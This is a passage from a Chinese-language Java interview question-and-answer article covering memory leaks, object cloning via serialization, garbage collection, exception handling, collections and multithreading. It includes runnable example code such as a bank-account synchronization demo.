&#125; private void ensureCapacity() &#123; if(elements.length == size) &#123; elements = Arrays.copyOf(elements, 2 * size + 1); &#125; &#125;&#125; 上面的代码实现了一个栈（先进后出（FILO））结构，乍看之下似乎没有什么明显的问题，它甚至可以通过你编写的各种单元测试。然而其中的pop方法却存在内存泄露的问题，当我们用pop方法弹出栈中的对象时，该对象不会被当作垃圾回收，即使使用栈的程序不再引用这些对象，因为栈内部维护着对这些对象的过期引用（obsolete reference）。在支持垃圾回收的语言中，内存泄露是很隐蔽的，这种内存泄露其实就是无意识的对象保持。如果一个对象引用被无意识的保留起来了，那么垃圾回收器不会处理这个对象，也不会处理该对象引用的其他对象，即使这样的对象只有少数几个，也可能会导致很多的对象被排除在垃圾回收之外，从而对性能造成重大影响，极端情况下会引发Disk Paging（物理内存与硬盘的虚拟内存交换数据），甚至造成OutOfMemoryError。 抽象的（abstract）方法是否可同时是静态的（static）,是否可同时是本地方法（native），是否可同时被synchronized修饰？都不能。抽象方法需要子类重写，而静态的方法是无法被重写的，因此二者是矛盾的。本地方法是由本地代码（如C代码）实现的方法，而抽象方法是没有实现的，也是矛盾的。synchronized和方法的实现细节有关，抽象方法不涉及实现细节，因此也是相互矛盾的。 阐述静态变量和实例变量的区别。静态变量是被static修饰符修饰的变量，也称为类变量，它属于类，不属于类的任何一个对象，一个类不管创建多少个对象，静态变量在内存中有且仅有一个拷贝；实例变量必须依存于某一实例，需要先创建对象然后通过对象才能访问到它。静态变量可以实现让多个对象共享内存。 补充：在Java开发中，上下文类和工具类中通常会有大量的静态成员。 是否可以从一个静态（static）方法内部发出对非静态（non-static）方法的调用？不可以，静态方法只能访问静态成员，因为非静态方法的调用要先创建对象，在调用静态方法时可能对象并没有被初始化。 如何实现对象克隆？有两种方式：1). 实现Cloneable接口并重写Object类中的clone()方法；2). 实现Serializable接口，通过对象的序列化和反序列化实现克隆，可以实现真正的深度克隆，代码如下。 123456789101112131415161718192021222324import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream; public class MyUtil &#123; private MyUtil() &#123; throw new AssertionError(); &#125; public static &lt;T&gt; T clone(T obj) throws Exception &#123; ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bout); oos.writeObject(obj); ByteArrayInputStream bin = new ByteArrayInputStream(bout.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bin); return (T) ois.readObject(); // 说明：调用ByteArrayInputStream或ByteArrayOutputStream对象的close方法没有任何意义 // 这两个基于内存的流只要垃圾回收器清理对象就能够释放资源，这一点不同于对外部资源（如文件流）的释放 &#125;&#125; 下面是测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.io.Serializable; /** * 人类 * @author 骆昊 * */class Person implements Serializable &#123; private static final long serialVersionUID = -9102017020286042305L; private String name; // 姓名 private int age; // 年龄 private Car car; // 座驾 public Person(String name, int age, Car car) &#123; this.name = name; this.age = age; this.car = car; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Car getCar() &#123; return car; &#125; public void setCar(Car car) &#123; this.car = car; &#125; @Override public String toString() &#123; return "Person [name=" + name + ", age=" + age + ", car=" + car + "]"; &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738/** * 小汽车类 * @author 骆昊 * */class Car implements Serializable &#123; private static final long serialVersionUID = -5713945027627603702L; private String brand; // 品牌 private int maxSpeed; // 最高时速 public Car(String brand, int maxSpeed) &#123; this.brand = brand; this.maxSpeed = maxSpeed; &#125; public String getBrand() &#123; return brand; &#125; public void setBrand(String brand) &#123; this.brand = brand; &#125; public int getMaxSpeed() &#123; return maxSpeed; &#125; public void setMaxSpeed(int maxSpeed) &#123; this.maxSpeed = maxSpeed; &#125; @Override public String toString() &#123; return "Car [brand=" + brand + ", maxSpeed=" + maxSpeed + "]"; &#125; &#125; 12345678910111213141516class CloneTest &#123; public static void main(String[] args) &#123; try &#123; Person p1 = new Person("Hao LUO", 33, new Car("Benz", 300)); Person p2 = MyUtil.clone(p1); // 深度克隆 p2.getCar().setBrand("BYD"); // 修改克隆的Person对象p2关联的汽车对象的品牌属性 // 原来的Person对象p1关联的汽车不会受到任何影响 // 因为在克隆Person对象时其关联的汽车对象也被克隆了 System.out.println(p1); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意：基于序列化和反序列化实现的克隆不仅仅是深度克隆，更重要的是通过泛型限定，可以检查出要克隆的对象是否支持序列化，这项检查是编译器完成的，不是在运行时抛出异常，这种是方案明显优于使用Object类的clone方法克隆对象。让问题在编译的时候暴露出来总是优于把问题留到运行时。 GC是什么？为什么要有GC？GC是垃圾收集的意思，内存处理是编程人员容易出现问题的地方，忘记或者错误的内存回收会导致程序或系统的不稳定甚至崩溃，Java提供的GC功能可以自动监测对象是否超过作用域从而达到自动回收内存的目的，Java语言没有提供释放已分配内存的显示操作方法。Java程序员不用担心内存管理，因为垃圾收集器会自动进行管理。要请求垃圾收集，可以调用下面的方法之一：System.gc() 或Runtime.getRuntime().gc() ，但JVM可以屏蔽掉显示的垃圾回收调用。垃圾回收可以有效的防止内存泄露，有效的使用可以使用的内存。垃圾回收器通常是作为一个单独的低优先级的线程运行，不可预知的情况下对内存堆中已经死亡的或者长时间没有使用的对象进行清除和回收，程序员不能实时的调用垃圾回收器对某个对象或所有对象进行垃圾回收。在Java诞生初期，垃圾回收是Java最大的亮点之一，因为服务器端的编程需要有效的防止内存泄露问题，然而时过境迁，如今Java的垃圾回收机制已经成为被诟病的东西。移动智能终端用户通常觉得iOS的系统比Android系统有更好的用户体验，其中一个深层次的原因就在于Android系统中垃圾回收的不可预知性。 补充：垃圾回收机制有很多种，包括：分代复制垃圾回收、标记垃圾回收、增量垃圾回收等方式。标准的Java进程既有栈又有堆。栈保存了原始型局部变量，堆保存了要创建的对象。Java平台对堆内存回收和再利用的基本算法被称为标记和清除，但是Java对其进行了改进，采用“分代式垃圾收集”。这种方法会跟Java对象的生命周期将堆内存划分为不同的区域，在垃圾收集过程中，可能会将对象移动到不同区域： 伊甸园（Eden）：这是对象最初诞生的区域，并且对大多数对象来说，这里是它们唯一存在过的区域。 幸存者乐园（Survivor）：从伊甸园幸存下来的对象会被挪到这里。 终身颐养园（Tenured）：这是足够老的幸存对象的归宿。年轻代收集（Minor-GC）过程是不会触及这个地方的。当年轻代收集不能把对象放进终身颐养园时，就会触发一次完全收集（Major-GC），这里可能还会牵扯到压缩，以便为大对象腾出足够的空间。 与垃圾回收相关的JVM参数： -Xms / -Xmx — 堆的初始大小 / 堆的最大大小-Xmn — 堆中年轻代的大小-XX:-DisableExplicitGC — 让System.gc()不产生任何作用-XX:+PrintGCDetails — 打印GC的细节-XX:+PrintGCDateStamps — 打印GC操作的时间戳-XX:NewSize / XX:MaxNewSize — 设置新生代大小/新生代最大大小-XX:NewRatio — 可以设置老生代和新生代的比例-XX:PrintTenuringDistribution — 设置每次新生代GC后输出幸存者乐园中对象年龄的分布-XX:InitialTenuringThreshold / -XX:MaxTenuringThreshold：设置老年代阀值的初始值和最大值-XX:TargetSurvivorRatio：设置幸存区的目标使用率 String s = new String(“xyz”);创建了几个字符串对象？两个对象，一个是静态区的”xyz”，一个是用new创建在堆上的对象。 接口是否可继承（extends）接口？抽象类是否可实现（implements）接口？抽象类是否可继承具体类（concrete class）？接口可以继承接口，而且支持多重继承。抽象类可以实现(implements)接口，抽象类可继承具体类也可以继承抽象类。 一个”.java”源文件中是否可以包含多个类（不是内部类）？有什么限制？可以，但一个源文件中最多只能有一个公开类（public class）而且文件名必须和公开类的类名完全保持一致。 Anonymous Inner Class(匿名内部类)是否可以继承其它类？是否可以实现接口？可以继承其他类或实现其他接口，在Swing编程和Android开发中常用此方式来实现事件监听和回调。 内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制？一个内部类对象可以访问创建它的外部类对象的成员，包括私有成员。 Java 中的final关键字有哪些用法？(1)修饰类：表示该类不能被继承；(2)修饰方法：表示方法不能被重写；(3)修饰变量：表示变量只能一次赋值以后值不能被修改（常量）。 指出下面程序的运行结果。123456789101112131415161718192021222324252627282930class A &#123; static &#123; System.out.print("1"); &#125; public A() &#123; System.out.print("2"); &#125;&#125; class B extends A&#123; static &#123; System.out.print("a"); &#125; public B() &#123; System.out.print("b"); &#125;&#125; public class Hello &#123; public static void main(String[] args) &#123; A ab = new B(); ab = new B(); &#125; &#125; 执行结果：1a2b2b。创建对象时构造器的调用顺序是：先初始化静态成员，然后调用父类构造器，再初始化非静态成员，最后调用自身构造器。 提示：如果不能给出此题的正确答案，说明之前第21题Java类加载机制还没有完全理解，赶紧再看看吧。 怎样将GB2312编码的字符串转换为ISO-8859-1编码的字符串？12String s1 = "你好";String s2 = new String(s1.getBytes("GB2312"), "ISO-8859-1"); 比较一下Java和JavaSciprt。JavaScript 与Java是两个公司开发的不同的两个产品。Java 是原Sun Microsystems公司推出的面向对象的程序设计语言，特别适合于互联网应用程序开发；而JavaScript是Netscape公司的产品，为了扩展Netscape浏览器的功能而开发的一种可以嵌入Web页面中运行的基于对象和事件驱动的解释性语言。JavaScript的前身是LiveScript；而Java的前身是Oak语言。下面对两种语言间的异同作如下比较： 基于对象和面向对象：Java是一种真正的面向对象的语言，即使是开发简单的程序，必须设计对象；JavaScript是种脚本语言，它可以用来制作与网络无关的，与用户交互作用的复杂软件。它是一种基于对象（Object-Based）和事件驱动（Event-Driven）的编程语言，因而它本身提供了非常丰富的内部对象供设计人员使用。 解释和编译：Java的源代码在执行之前，必须经过编译。JavaScript是一种解释性编程语言，其源代码不需经过编译，由浏览器解释执行。（目前的浏览器几乎都使用了JIT（即时编译）技术来提升JavaScript的运行效率） 强类型变量和类型弱变量：Java采用强类型变量检查，即所有变量在编译之前必须作声明；JavaScript中变量是弱类型的，甚至在使用变量前可以不作声明，JavaScript的解释器在运行时检查推断其数据类型。 代码格式不一样。 补充：上面列出的四点是网上流传的所谓的标准答案。其实Java和JavaScript最重要的区别是一个是静态语言，一个是动态语言。目前的编程语言的发展趋势是函数式语言和动态语言。在Java中类（class）是一等公民，而JavaScript中函数（function）是一等公民，因此JavaScript支持函数式编程，可以使用Lambda函数和闭包（closure），当然Java 8也开始支持函数式编程，提供了对Lambda表达式以及函数式接口的支持。对于这类问题，在面试的时候最好还是用自己的语言回答会更加靠谱，不要背网上所谓的标准答案。 什么时候用断言（assert）？断言在软件开发中是一种常用的调试方式，很多开发语言中都支持这种机制。一般来说，断言用于保证程序最基本、关键的正确性。断言检查通常在开发和测试时开启。为了保证程序的执行效率，在软件发布后断言检查通常是关闭的。断言是一个包含布尔表达式的语句，在执行这个语句时假定该表达式为true；如果表达式的值为false，那么系统会报告一个AssertionError。断言的使用如下面的代码所示： 1assert(a &gt; 0); // throws an AssertionError if a &lt;= 0 断言可以有两种形式：assert Expression1;assert Expression1 : Expression2 ;Expression1 应该总是产生一个布尔值。Expression2 可以是得出一个值的任意表达式；这个值用于生成显示更多调试信息的字符串消息。 要在运行时启用断言，可以在启动JVM时使用-enableassertions或者-ea标记。要在运行时选择禁用断言，可以在启动JVM时使用-da或者-disableassertions标记。要在系统类中启用或禁用断言，可使用-esa或-dsa标记。还可以在包的基础上启用或者禁用断言。 注意：断言不应该以任何方式改变程序的状态。简单的说，如果希望在不满足某些条件时阻止代码的执行，就可以考虑用断言来阻止它。 Error和Exception有什么区别？Error表示系统级的错误和程序不必处理的异常，是恢复不是不可能但很困难的情况下的一种严重问题；比如内存溢出，不可能指望程序能处理这样的情况；Exception表示需要捕捉或者需要程序进行处理的异常，是一种设计或实现问题；也就是说，它表示如果程序运行正常，从不会发生的情况。 面试题：2005年摩托罗拉的面试中曾经问过这么一个问题“If a process reports a stack overflow run-time error, what’s the most possible cause?”，给了四个选项a. lack of memory; b. write on an invalid memory space; c. recursive function calling; d. array index out of boundary. Java程序在运行时也可能会遭遇StackOverflowError，这是一个无法恢复的错误，只能重新修改代码了，这个面试题的答案是c。如果写了不能迅速收敛的递归，则很有可能引发栈溢出的错误，如下所示： 123456class StackOverflowErrorTest &#123; public static void main(String[] args) &#123; main(null); &#125;&#125; 提示：用递归编写程序时一定要牢记两点：1. 递归公式；2. 收敛条件（什么时候就不再继续递归）。 try{}里有一个return语句，那么紧跟在这个try后的finally{}里的代码会不会被执行，什么时候被执行，在return前还是后?会执行，在方法返回调用者前执行。 注意：在finally中改变返回值的做法是不好的，因为如果存在finally代码块，try中的return语句不会立马返回调用者，而是记录下返回值待finally代码块执行完毕之后再向调用者返回其值，然后如果在finally中修改了返回值，就会返回修改后的值。显然，在finally中返回或者修改返回值会对程序造成很大的困扰，C#中直接用编译错误的方式来阻止程序员干这种龌龊的事情，Java中也可以通过提升编译器的语法检查级别来产生警告或错误，Eclipse中可以在如图所示的地方进行设置，强烈建议将此项设置为编译错误。 Java语言如何进行异常处理，关键字：throws、throw、try、catch、finally分别如何使用？Java通过面向对象的方法进行异常处理，把各种不同的异常进行分类，并提供了良好的接口。在Java中，每个异常都是一个对象，它是Throwable类或其子类的实例。当一个方法出现异常后便抛出一个异常对象，该对象中包含有异常信息，调用这个对象的方法可以捕获到这个异常并可以对其进行处理。Java的异常处理是通过5个关键词来实现的：try、catch、throw、throws和finally。一般情况下是用try来执行一段程序，如果系统会抛出（throw）一个异常对象，可以通过它的类型来捕获（catch）它，或通过总是执行代码块（finally）来处理；try用来指定一块预防所有异常的程序；catch子句紧跟在try块后面，用来指定你想要捕获的异常的类型；throw语句用来明确地抛出一个异常；throws用来声明一个方法可能抛出的各种异常（当然声明异常时允许无病呻吟）；finally为确保一段代码不管发生什么异常状况都要被执行；try语句可以嵌套，每当遇到一个try语句，异常的结构就会被放入异常栈中，直到所有的try语句都完成。如果下一级的try语句没有对某种异常进行处理，异常栈就会执行出栈操作，直到遇到有处理这种异常的try语句或者最终将异常抛给JVM。 运行时异常与受检异常有何异同？异常表示程序运行过程中可能出现的非正常状态，运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误，只要程序设计得没有问题通常就不会发生。受检异常跟程序运行的上下文环境有关，即使程序设计无误，仍然可能因使用的问题而引发。Java编译器要求方法必须声明抛出可能发生的受检异常，但是并不要求必须声明抛出未被捕获的运行时异常。异常和继承一样，是面向对象程序设计中经常被滥用的东西，在Effective Java中对异常的使用给出了以下指导原则： 不要将异常处理用于正常的控制流（设计良好的API不应该强迫它的调用者为了正常的控制流而使用异常） 对可以恢复的情况使用受检异常，对编程错误使用运行时异常 避免不必要的使用受检异常（可以通过一些状态检测手段来避免异常的发生） 优先使用标准的异常 每个方法抛出的异常都要有文档 保持异常的原子性 不要在catch中忽略掉捕获到的异常 列出一些你常见的运行时异常？ ArithmeticException（算术异常） ClassCastException （类转换异常） IllegalArgumentException （非法参数异常） IndexOutOfBoundsException （下标越界异常） NullPointerException （空指针异常） SecurityException （安全异常） 阐述final、finally、finalize的区别。 final：修饰符（关键字）有三种用法：如果一个类被声明为final，意味着它不能再派生出新的子类，即不能被继承，因此它和abstract是反义词。将变量声明为final，可以保证它们在使用中不被改变，被声明为final的变量必须在声明时给定初值，而在以后的引用中只能读取不可修改。被声明为final的方法也同样只能使用，不能在子类中被重写。 finally：通常放在try…catch…的后面构造总是执行代码块，这就意味着程序无论正常执行还是发生异常，这里的代码只要JVM不关闭都能执行，可以将释放外部资源的代码写在finally块中。 finalize：Object类中定义的方法，Java中允许使用finalize()方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在销毁对象时调用的，通过重写finalize()方法可以整理系统资源或者执行其他清理工作。 类ExampleA继承Exception，类ExampleB继承ExampleA。请问执行此段代码的输出是什么？1234567try &#123; throw new ExampleB("b")&#125; catch（ExampleA e）&#123; System.out.println("ExampleA");&#125; catch（Exception e）&#123; System.out.println("Exception");&#125; 输出：ExampleA。（根据里氏代换原则[能使用父类型的地方一定能使用子类型]，抓取ExampleA类型异常的catch块能够抓住try块中抛出的ExampleB类型的异常） 面试题 - 说出下面代码的运行结果。（此题的出处是《Java编程思想》一书） 12345678910111213141516171819202122232425class Annoyance extends Exception &#123;&#125;class Sneeze extends Annoyance &#123;&#125; class Human &#123; public static void main(String[] args) throws Exception &#123; try &#123; try &#123; throw new Sneeze(); &#125; catch ( Annoyance a ) &#123; System.out.println("Caught Annoyance"); throw a; &#125; &#125; catch ( Sneeze s ) &#123; System.out.println("Caught Sneeze"); return ; &#125; finally &#123; System.out.println("Hello World!"); &#125; &#125;&#125; List、Set、Map是否继承自Collection接口？List、Set 是，Map 不是。Map是键值对映射容器，与List和Set有明显的区别，而Set存储的零散的元素且不允许有重复元素（数学中的集合也是如此），List是线性结构的容器，适用于按数值索引访问元素的情形。 阐述ArrayList、Vector、LinkedList的存储性能和特性。ArrayList 和Vector都是使用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，它们都允许直接按序号索引元素，但是插入元素要涉及数组元素移动等内存操作，所以索引数据快而插入数据慢，Vector中的方法由于添加了synchronized修饰，因此Vector是线程安全的容器，但性能上较ArrayList差，因此已经是Java中的遗留容器。LinkedList使用双向链表实现存储（将内存中零散的内存单元通过附加的引用关联起来，形成一个可以按序号索引的线性结构，这种链式存储方式与数组的连续存储方式相比，内存的利用率更高），按序号索引数据需要进行前向或后向遍历，但是插入数据时只需要记录本项的前后项即可，所以插入速度较快。Vector属于遗留容器（Java早期的版本中提供的容器，除此之外，Hashtable、Dictionary、BitSet、Stack、Properties都是遗留容器），已经不推荐使用，但是由于ArrayList和LinkedListed都是非线程安全的，如果遇到多个线程操作同一个容器的场景，则可以通过工具类Collections中的synchronizedList方法将其转换成线程安全的容器后再使用（这是对装潢模式的应用，将已有对象传入另一个类的构造器中创建新的对象来增强实现）。 补充：遗留容器中的Properties类和Stack类在设计上有严重的问题，Properties是一个键和值都是字符串的特殊的键值对映射，在设计上应该是关联一个Hashtable并将其两个泛型参数设置为String类型，但是Java API中的Properties直接继承了Hashtable，这很明显是对继承的滥用。这里复用代码的方式应该是Has-A关系而不是Is-A关系，另一方面容器都属于工具类，继承工具类本身就是一个错误的做法，使用工具类最好的方式是Has-A关系（关联）或Use-A关系（依赖）。同理，Stack类继承Vector也是不正确的。Sun公司的工程师们也会犯这种低级错误，让人唏嘘不已。 Collection和Collections的区别？Collection是一个接口，它是Set、List等容器的父接口；Collections是个一个工具类，提供了一系列的静态方法来辅助容器操作，这些方法包括对容器的搜索、排序、线程安全化等等。 List、Map、Set三个接口存取元素时，各有什么特点？List以特定索引来存取元素，可以有重复元素。Set不能存放重复元素（用对象的equals()方法来区分元素是否重复）。Map保存键值对（key-value pair）映射，映射关系可以是一对一或多对一。Set和Map容器都有基于哈希存储和排序树的两种实现版本，基于哈希存储的版本理论存取时间复杂度为O(1)，而基于排序树版本的实现在插入或删除元素时会按照元素或元素的键（key）构成排序树从而达到排序和去重的效果。 TreeMap和TreeSet在排序时如何比较元素？Collections工具类中的sort()方法如何比较元素？TreeSet要求存放的对象所属的类必须实现Comparable接口，该接口提供了比较元素的compareTo()方法，当插入元素时会回调该方法比较元素的大小。TreeMap要求存放的键值对映射的键必须实现Comparable接口从而根据键对元素进行排序。Collections工具类的sort方法有两种重载的形式，第一种要求传入的待排序容器中存放的对象比较实现Comparable接口以实现元素的比较；第二种不强制性的要求容器中的元素必须可比较，但是要求传入第二个参数，参数是Comparator接口的子类型（需要重写compare方法实现元素的比较），相当于一个临时定义的排序规则，其实就是通过接口注入比较元素大小的算法，也是对回调模式的应用（Java中对函数式编程的支持）。 Thread类的sleep()方法和对象的wait()方法都可以让线程暂停执行，它们有什么区别?sleep()方法（休眠）是线程类（Thread）的静态方法，调用此方法会让当前线程暂停执行指定的时间，将执行机会（CPU）让给其他线程，但是对象的锁依然保持，因此休眠时间结束后会自动恢复（线程回到就绪状态，请参考第66题中的线程状态转换图）。wait()是Object类的方法，调用对象的wait()方法导致当前线程放弃对象的锁（线程暂停执行），进入对象的等待池（wait pool），只有调用对象的notify()方法（或notifyAll()方法）时才能唤醒等待池中的线程进入等锁池（lock pool），如果线程重新获得对象的锁就可以进入就绪状态。 补充：可能不少人对什么是进程，什么是线程还比较模糊，对于为什么需要多线程编程也不是特别理解。简单的说：进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动，是操作系统进行资源分配和调度的一个独立单位；线程是进程的一个实体，是CPU调度和分派的基本单位，是比进程更小的能独立运行的基本单位。线程的划分尺度小于进程，这使得多线程程序的并发性高；进程在执行时通常拥有独立的内存单元，而线程之间可以共享内存。使用多线程的编程通常能够带来更好的性能和用户体验，但是多线程的程序对于其他程序是不友好的，因为它可能占用了更多的CPU资源。当然，也不是线程越多，程序的性能就越好，因为线程之间的调度和切换也会浪费CPU时间。时下很时髦的Node.js就采用了单线程异步I/O的工作模式。 线程的sleep()方法和yield()方法有什么区别？ sleep()方法给其他线程运行机会时不考虑线程的优先级，因此会给低优先级的线程以运行的机会；yield()方法只会给相同优先级或更高优先级的线程以运行的机会； 线程执行sleep()方法后转入阻塞（blocked）状态，而执行yield()方法后转入就绪（ready）状态； sleep()方法声明抛出InterruptedException，而yield()方法没有声明任何异常； sleep()方法比yield()方法（跟操作系统CPU调度相关）具有更好的可移植性。 当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？不能。其它线程只能访问该对象的非同步方法，同步方法则不能进入。因为非静态方法上的synchronized修饰符要求执行方法时要获得对象的锁，如果已经进入A方法说明对象锁已经被取走，那么试图进入B方法的线程就只能在等锁池（注意不是等待池哦）中等待对象的锁。 请说出与线程同步以及线程调度相关的方法。 wait()：使一个线程处于等待（阻塞）状态，并且释放所持有的对象的锁； sleep()：使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要处理InterruptedException异常； notify()：唤醒一个处于等待状态的线程，当然在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且与优先级无关； notityAll()：唤醒所有处于等待状态的线程，该方法并不是将对象的锁给所有线程，而是让它们竞争，只有获得锁的线程才能进入就绪状态； 提示：关于Java多线程和并发编程的问题，建议大家看我的另一篇文章《关于Java并发编程的总结和思考》。 补充：Java 5通过Lock接口提供了显式的锁机制（explicit lock），增强了灵活性以及对线程的协调。Lock接口中定义了加锁（lock()）和解锁（unlock()）的方法，同时还提供了newCondition()方法来产生用于线程之间通信的Condition对象；此外，Java 5还提供了信号量机制（semaphore），信号量可以用来限制对某个共享资源进行访问的线程的数量。在对资源进行访问之前，线程必须得到信号量的许可（调用Semaphore对象的acquire()方法）；在完成对资源的访问后，线程必须向信号量归还许可（调用Semaphore对象的release()方法）。 下面的例子演示了100个线程同时向一个银行账户中存入1元钱，在没有使用同步机制和使用同步机制情况下的执行情况。银行账户类： 123456789101112131415161718192021222324252627282930/** * 银行账户 * @author 骆昊 * */public class Account &#123; private double balance; // 账户余额 /** * 存款 * @param money 存入金额 */ public void deposit(double money) &#123; double newBalance = balance + money; try &#123; Thread.sleep(10); // 模拟此业务需要一段处理时间 &#125; catch(InterruptedException ex) &#123; ex.printStackTrace(); &#125; balance = newBalance; &#125; /** * 获得账户余额 */ public double getBalance() &#123; return balance; &#125;&#125; 存钱线程类： 1234567891011121314151617181920/** * 存钱线程 * @author 骆昊 * */public class AddMoneyThread implements Runnable &#123; private Account account; // 存入账户 private double money; // 存入金额 public AddMoneyThread(Account account, double money) &#123; this.account = account; this.money = money; &#125; @Override public void run() &#123; account.deposit(money); &#125; &#125; 测试类： 1234567891011121314151617181920import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors; public class Test01 &#123; public static void main(String[] args) &#123; Account account = new Account(); ExecutorService service = Executors.newFixedThreadPool(100); for(int i = 1; i &lt;= 100; i++) &#123; service.execute(new AddMoneyThread(account, 1)); &#125; service.shutdown(); while(!service.isTerminated()) &#123;&#125; System.out.println("账户余额: " + account.getBalance()); &#125;&#125; 在没有同步的情况下，执行结果通常是显示账户余额在10元以下，出现这种状况的原因是，当一个线程A试图存入1元的时候，另外一个线程B也能够进入存款的方法中，线程B读取到的账户余额仍然是线程A存入1元钱之前的账户余额，因此也是在原来的余额0上面做了加1元的操作，同理线程C也会做类似的事情，所以最后100个线程执行结束时，本来期望账户余额为100元，但实际得到的通常在10元以下（很可能是1元哦）。解决这个问题的办法就是同步，当一个线程对银行账户存钱时，需要将此账户锁定，待其操作完成后才允许其他的线程进行操作，代码有如下几种调整方案： 在银行账户的存款（deposit）方法上同步（synchronized）关键字: 123456789101112131415161718192021222324252627282930/** * 银行账户 * @author 骆昊 * */public class Account &#123; private double balance; // 账户余额 /** * 存款 * @param money 存入金额 */ public synchronized void deposit(double money) &#123; double newBalance = balance + money; try &#123; Thread.sleep(10); // 模拟此业务需要一段处理时间 &#125; catch(InterruptedException ex) &#123; ex.printStackTrace(); &#125; balance = newBalance; &#125; /** * 获得账户余额 */ public double getBalance() &#123; return balance; &#125;&#125; 在线程调用存款方法时对银行账户进行同步 12345678910111213141516171819202122/** * 存钱线程 * @author 骆昊 * */public class AddMoneyThread implements Runnable &#123; private Account account; // 存入账户 private double money; // 存入金额 public AddMoneyThread(Account account, double money) &#123; this.account = account; this.money = money; &#125; @Override public void run() &#123; synchronized (account) &#123; account.deposit(money); &#125; &#125; &#125; 通过Java 5显示的锁机制，为每个银行账户创建一个锁对象，在存款操作进行加锁和解锁的操作12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.concurrent.locks.Lock;import java.util.concurrent.locks.ReentrantLock; /** * 银行账户 * * @author 骆昊 * */public class Account &#123; private Lock accountLock = new ReentrantLock(); private double balance; // 账户余额 /** * 存款 * * @param money * 存入金额 */ public void deposit(double money) &#123; accountLock.lock(); try &#123; double newBalance = balance + money; try &#123; Thread.sleep(10); // 模拟此业务需要一段处理时间 &#125; catch (InterruptedException ex) &#123; ex.printStackTrace(); &#125; balance = newBalance; &#125; finally &#123; accountLock.unlock(); &#125; &#125; /** * 获得账户余额 */ public double getBalance() &#123; return balance; &#125;&#125; 按照上述三种方式对代码进行修改后，重写执行测试代码Test01，将看到最终的账户余额为100元。当然也可以使用Semaphore或CountdownLatch来实现同步。 编写多线程程序有几种实现方式？Java 5以前实现多线程有两种实现方法：一种是继承Thread类；另一种是实现Runnable接口。两种方式都要通过重写run()方法来定义线程的行为，推荐使用后者，因为Java中的继承是单继承，一个类有一个父类，如果继承了Thread类就无法再继承其他类了，显然使用Runnable接口更为灵活。 补充：Java 5以后创建线程还有第三种方式：实现Callable接口，该接口中的call方法可以在线程执行结束时产生一个返回值，代码如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.ArrayList;import java.util.List;import java.util.concurrent.Callable;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.Future; class MyTask implements Callable&lt;Integer&gt; &#123; private int upperBounds; public MyTask(int upperBounds) &#123; this.upperBounds = upperBounds; &#125; @Override public Integer call() throws Exception &#123; int sum = 0; for(int i = 1; i &lt;= upperBounds; i++) &#123; sum += i; &#125; return sum; &#125; &#125; class Test &#123; public static void main(String[] args) throws Exception &#123; List&lt;Future&lt;Integer&gt;&gt; list = new ArrayList&lt;&gt;(); ExecutorService service = Executors.newFixedThreadPool(10); for(int i = 0; i &lt; 10; i++) &#123; list.add(service.submit(new MyTask((int) (Math.random() * 100)))); &#125; int sum = 0; for(Future&lt;Integer&gt; future : list) &#123; // while(!future.isDone()) ; sum += future.get(); &#125; System.out.println(sum); &#125;&#125; synchronized关键字的用法？synchronized关键字可以将对象或者方法标记为同步，以实现对对象和方法的互斥访问，可以用synchronized(对象) { … }定义同步代码块，或者在声明方法时将synchronized作为方法的修饰符。在第60题的例子中已经展示了synchronized关键字的用法。 举例说明同步和异步。如果系统中存在临界资源（资源数量少于竞争资源的线程数量的资源），例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就必须进行同步存取（数据库操作中的排他锁就是最好的例子）。当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。事实上，所谓的同步就是指阻塞式操作，而异步就是非阻塞式操作。 启动一个线程是调用run()还是start()方法？启动一个线程是调用start()方法，使线程所代表的虚拟处理机处于可运行状态，这意味着它可以由JVM 调度并执行，这并不意味着线程就会立即运行。run()方法是线程启动后要进行回调（callback）的方法。 什么是线程池（thread pool）？在面向对象编程中，创建和销毁对象是很费时间的，因为创建一个对象要获取内存资源或者其它更多资源。在Java中更是如此，虚拟机将试图跟踪每一个对象，以便能够在对象销毁后进行垃圾回收。所以提高服务程序效率的一个手段就是尽可能减少创建和销毁对象的次数，特别是一些很耗资源的对象创建和销毁，这就是”池化资源”技术产生的原因。线程池顾名思义就是事先创建若干个可执行的线程放入一个池（容器）中，需要的时候从池中获取线程不用自行创建，使用完毕不需要销毁线程而是放回池中，从而减少创建和销毁线程对象的开销。Java 5+中的Executor接口定义一个执行线程的工具。它的子类型即线程池接口是ExecutorService。要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，因此在工具类Executors面提供了一些静态工厂方法，生成一些常用的线程池，如下所示： newSingleThreadExecutor：创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。 newFixedThreadPool：创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。 